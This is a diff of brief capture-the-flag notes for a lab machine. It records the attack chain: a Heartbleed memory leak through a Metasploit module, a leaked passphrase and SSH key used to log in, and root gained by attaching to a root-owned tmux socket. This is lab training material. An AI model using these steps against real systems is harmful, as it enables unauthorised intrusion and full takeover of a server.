@@ -3,4 +3,27 @@ port 80 <- check the website
 22 ssh
 443 <- https => site has SSL/TLS implemented
 
-Checked out the version of TLS
+nmap --script vuln scans shows this server might be vulnerable for sslheartbleed.
+Likely based on the machine name and the homepage.
+
+metaploits has an exploit for this.
+auxiliary/scanner/ssl/openssl_heartbleed
+
+dump the memory leak
+-> suspicious b64 string found -> decoded to -> heartbleedbelievethehype
+from the exposed directories found from gobuster -> dev/hype_key
+decoded from hex -> ssh private key
+chmod 600 hype_key then ssh in the session: ssh -i hype_key hype@10.10.10.79
+passphrase for the private key: heartbleedbelievethehype
+user.txt is located in /home/hype/Desktop
+user pwned!
+
+-----------------------------------------------------------------------------------
+
+upload linpeas.sh to the server.
+Running linpeas.sh -> possible attack vectors: old kernel version, tmux session being run as root
+ps aux shows /usr/bin/tmux -S /.devs/dev_sess being run as root.
+Let's try it:
+/usr/bin/tmux -S /.devs/dev_sess -> root session gained
+root.txt is located in /root
+root pwned!
